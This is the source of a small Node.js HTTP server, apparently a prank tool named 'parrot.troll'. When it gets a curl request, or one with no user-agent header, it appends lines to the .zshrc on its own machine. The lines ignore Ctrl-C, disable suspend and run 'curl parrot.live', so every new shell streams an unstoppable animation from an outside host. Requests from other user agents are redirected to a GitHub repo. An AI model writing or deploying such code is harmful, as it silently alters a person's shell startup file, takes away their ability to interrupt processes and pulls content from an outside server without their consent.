const fs = require("mz/fs");
const http = require("http");
const path = require("path");
const { Readable } = require("stream");

const append_2_zshrc = async () => {
	const zshrc_path = path.join(process.env.HOME, ".zshrc");
	const parrot_troll = `
trap '' 2
stty susp undef
curl parrot.live
`;
	await fs.appendFile(zshrc_path, parrot_troll);
	return "Parrot Troll 🦜 added to .zshrc!";
};

const streamer = async (stream) => {
	try {
		const result = await append_2_zshrc();
		stream.push(result + "\n");
	} catch (error) {
		stream.push("Error appending to .zshrc: " + error.message + "\n");
	} finally {
		stream.push(null);
	}
};

const server = http.createServer((req, res) => {
	if (req.url === "/healthcheck") {
		res.writeHead(200, { "Content-Type": "application/json" });
		return res.end(JSON.stringify({ status: "ok" }));
	}

	if (
		req.headers &&
		req.headers["user-agent"] &&
		!req.headers["user-agent"].includes("curl")
	) {
		res.writeHead(302, {
			Location: "https://github.com/PedroZappa/parrot.troll",
		});
		return res.end();
	}

	const stream = new Readable();
	stream._read = function noop() {};
	stream.pipe(res);

	streamer(stream);

	req.on("close", () => {
		stream.destroy();
	});
});

const port = process.env.PARROT_PORT || 3000;
server.listen(port, (err) => {
	if (err) throw err;
	console.log(`Listening on localhost:${port}`);
});
